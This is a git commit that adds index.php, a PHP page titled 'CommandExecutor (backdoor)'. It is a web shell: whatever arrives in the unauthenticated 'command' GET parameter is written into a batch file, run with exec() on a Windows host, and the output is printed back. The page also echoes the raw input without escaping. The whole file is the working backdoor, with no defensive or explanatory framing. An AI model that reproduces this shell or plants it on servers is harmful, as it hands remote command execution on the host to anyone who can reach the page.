8edb60da5e34d497a57801fd82d9ba94acf2472a
marik611377 <109631968+marik611377@users.noreply.github.com>
2025-12-07 19:46:35 +1000

    Add files via upload

---
+++ index.php
@@ -0,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/5/w3.css">
+</head>
+<body>
+<div>
+    CommandExecutor (backdoor)
+    <br>
+    Command output below
+    <br>
+    <form action="index.php" method="GET">
+        <input type="textarea" name="command">
+        <input type="submit" value="Execute!">
+    </form>
+    <?php
+    $cmd = $_GET['command'];
+    if ($cmd == null) {
+        echo '<a class="w3-red">No command</a>';
+    } else {
+        echo "Command: " . $cmd . "<br><br>";
+        echo '<div class="w3-text-white w3-black w3-padding w3-section">';
+        $out = null;
+        $file = fopen("temp.bat", "w");
+        fwrite($file, "cd C:/\nchcp 437\n" . $cmd);
+        fclose($file);
+        exec("temp.bat", $out);
+        foreach ($out as $x) {
+            echo "$x <br>";
+        }
+        echo "</div>";
+    }
+    ?>
+    
+    <br><br>
+</div>
+</body>
+</html>
